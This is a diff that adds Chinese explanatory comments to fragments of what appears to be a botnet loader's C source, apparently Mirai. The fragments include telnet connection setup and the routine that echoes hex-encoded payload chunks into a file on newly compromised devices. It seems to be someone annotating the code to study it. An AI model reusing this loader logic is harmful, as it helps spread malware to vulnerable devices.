@@ -10,6 +10,7 @@
 #include "headers/binary.h"
 #include "headers/util.h"
 
+//初始化conn结构体
 void connection_open(struct connection *conn)
 {
     pthread_mutex_lock(&conn->lock);
@@ -18,7 +19,7 @@ void connection_open(struct connection *conn)
     conn->last_recv = time(NULL);
     conn->timeout = 10;
     conn->echo_load_pos = 0;
-    conn->state_telnet = TELNET_CONNECTING;
+    conn->state_telnet = TELNET_CONNECTING;//状态设置为TELNET_CONNECTING
     conn->success = FALSE;
     conn->open = TRUE;
     conn->bin = NULL;
@@ -578,6 +579,7 @@ int connection_consume_upload_methods(struct connection *conn)
     return offset;
 }
 
+//echo方式是在这里将bin文件取出来并在new bot中echo到upnp文件中
 int connection_upload_echo(struct connection *conn)
 {
     int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));
@@ -599,7 +601,7 @@ int connection_upload_echo(struct connection *conn)
                     conn->bin->hex_payloads[conn->echo_load_pos], (conn->echo_load_pos == 0) ? ">" : ">>");
     conn->echo_load_pos++;
 
-    // Hack drain
+    // Hack drain　　　　　　　　？？？？
     memmove(conn->rdbuf, conn->rdbuf + offset, conn->rdbuf_pos - offset);
     conn->rdbuf_pos -= offset;
 
